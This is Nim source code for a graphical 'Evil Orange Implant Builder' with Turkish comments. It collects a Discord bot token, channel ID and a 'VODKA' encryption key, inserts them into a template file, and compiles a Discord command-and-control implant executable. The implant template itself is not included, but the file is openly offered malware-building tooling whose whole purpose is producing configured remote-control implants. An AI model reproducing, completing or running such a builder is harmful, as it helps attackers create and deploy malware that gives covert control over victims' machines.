
import nigui
import std/[strutils, osproc, os, random, times]

app.init()

# Ana pencere
var window = newWindow("Evil Orange Builder v1.0")
window.width = 550
window.height = 500
window.resizable = false

# Ana container - dikey
var mainContainer = newLayoutContainer(Layout_Vertical)
mainContainer.padding = 20
mainContainer.spacing = 10
window.add(mainContainer)

# ===== BAŞLIK =====
var titleLabel = newLabel("🍊 Evil Orange Implant Builder")
titleLabel.fontSize = 16
titleLabel.fontFamily = "Arial"
mainContainer.add(titleLabel)

var subtitleLabel = newLabel("Generate your Discord C2 implant")
subtitleLabel.fontSize = 10
mainContainer.add(subtitleLabel)

# Boşluk
mainContainer.add(newLabel(""))

# ===== TOKEN =====
var tokenContainer = newLayoutContainer(Layout_Horizontal)
tokenContainer.spacing = 5
mainContainer.add(tokenContainer)

var labelToken = newLabel("Bot Token:     ")
labelToken.minWidth = 100
tokenContainer.add(labelToken)

var textBoxToken = newTextBox()
textBoxToken.width = 350
tokenContainer.add(textBoxToken)

# ===== CHANNEL ID =====
var channelContainer = newLayoutContainer(Layout_Horizontal)
channelContainer.spacing = 5
mainContainer.add(channelContainer)

var labelChannel = newLabel("Channel ID:    ")
labelChannel.minWidth = 100
channelContainer.add(labelChannel)

var textBoxChannel = newTextBox()
textBoxChannel.width = 350
channelContainer.add(textBoxChannel)

# ===== VODKA KEY =====
var keyContainer = newLayoutContainer(Layout_Horizontal)
keyContainer.spacing = 5
mainContainer.add(keyContainer)

var labelKey = newLabel("VODKA Key:     ")
labelKey.minWidth = 100
keyContainer.add(labelKey)

var textBoxKey = newTextBox()
textBoxKey.width = 280
keyContainer.add(textBoxKey)

var buttonGenKey = newButton("🎲 Generate")
buttonGenKey.minWidth = 65
keyContainer.add(buttonGenKey)

# ===== OUTPUT PATH =====
var outputContainer = newLayoutContainer(Layout_Horizontal)
outputContainer.spacing = 5
mainContainer.add(outputContainer)

var labelOutput = newLabel("Output File:   ")
labelOutput.minWidth = 100
outputContainer.add(labelOutput)

var textBoxOutput = newTextBox()
textBoxOutput.width = 280
textBoxOutput.text = "orange_implant.exe"
outputContainer.add(textBoxOutput)

var buttonBrowse = newButton("📁 Browse")
buttonBrowse.minWidth = 65
outputContainer.add(buttonBrowse)

# Boşluk
mainContainer.add(newLabel(""))

# ===== BUILD BUTONU =====
var buttonBuild = newButton("🔨 BUILD IMPLANT")
buttonBuild.fontSize = 14
buttonBuild.minHeight = 40
mainContainer.add(buttonBuild)

# ===== DURUM LABEL =====
var labelStatus = newLabel("Status: Ready")
labelStatus.fontSize = 10
mainContainer.add(labelStatus)

# ===== LOG AREA =====
var logLabel = newLabel("Build Log:")
mainContainer.add(logLabel)

var textAreaLog = newTextArea()
textAreaLog.width = 500
textAreaLog.height = 120
textAreaLog.editable = false
textAreaLog.fontFamily = "Consolas"
textAreaLog.fontSize = 9
mainContainer.add(textAreaLog)

######## FONKSIYONLAR ########

proc log(msg: string) =
  let timestamp = now().format("HH:mm:ss")
  textAreaLog.addLine("[" & timestamp & "] " & msg)

proc generateKey(): string =
  randomize()
  const hexChars = "0123456789abcdef"
  var key = ""
  for i in 0..<64:
    key.add(hexChars[rand(15)])
  return key

proc buildImplant(token, channel, key, outputPath: string): bool =
  let templatePath = "template.nim"

  if not fileExists(templatePath):
    log("ERROR: template.nim not found!")
    return false

  log("Reading template...")
  var templateCode = readFile(templatePath)

  log("Replacing placeholders...")
  templateCode = templateCode.replace("{{DISCORD_TOKEN}}", token)
  templateCode = templateCode.replace("{{DISCORD_CHANNEL}}", channel)
  templateCode = templateCode.replace("{{VODKA_KEY}}", key)

  let tempFile = "temp_build_" & $getTime().toUnix & ".nim"

  log("Writing temp file: " & tempFile)
  writeFile(tempFile, templateCode)

  log("Compiling with Nim...")
  let compileCmd = "nim c -d:release --opt:size -o:" & outputPath & " " & tempFile
  log("Command: " & compileCmd)

  let (output, exitCode) = execCmdEx(compileCmd)

  log("Cleaning up temp file...")
  if fileExists(tempFile):
    removeFile(tempFile)

  if exitCode != 0:
    log("ERROR: Compilation failed!")
    log(output)
    return false

  log("SUCCESS: Implant built!")
  return true

######## EVENTLER ########

buttonGenKey.onClick = proc(event: ClickEvent) =
  let newKey = generateKey()
  textBoxKey.text = newKey
  log("Generated new VODKA key: " & newKey[0..15] & "...")

buttonBrowse.onClick = proc(event: ClickEvent) =
  textBoxOutput.text = "orange_implant.exe"
  log("Output set to: " & textBoxOutput.text)

buttonBuild.onClick = proc(event: ClickEvent) =
  let token = textBoxToken.text.strip()
  let channel = textBoxChannel.text.strip()
  let key = textBoxKey.text.strip()
  let output = textBoxOutput.text.strip()

  textAreaLog.text = ""

  if token.len == 0:
    labelStatus.text = "Status: ERROR - Token is empty!"
    log("ERROR: Bot token is required")
    return

  if channel.len == 0:
    labelStatus.text = "Status: ERROR - Channel ID is empty!"
    log("ERROR: Channel ID is required")
    return

  if key.len == 0:
    labelStatus.text = "Status: ERROR - VODKA key is empty!"
    log("ERROR: VODKA key is required")
    return

  if key.len != 64:
    labelStatus.text = "Status: ERROR - Key must be 64 hex chars!"
    log("ERROR: Key length is " & $key.len & ", expected 64")
    return

  labelStatus.text = "Status: Building..."
  log("Starting build process...")
  log("Token: " & token[0..min(15, token.len-1)] & "...")
  log("Channel: " & channel)
  log("Key: " & key[0..15] & "...")
  log("Output: " & output)

  if buildImplant(token, channel, key, output):
    labelStatus.text = "Status: Build successful! -> " & output
    log("Output file: " & getCurrentDir() / output)
  else:
    labelStatus.text = "Status: Build FAILED!"

window.show()
app.run()
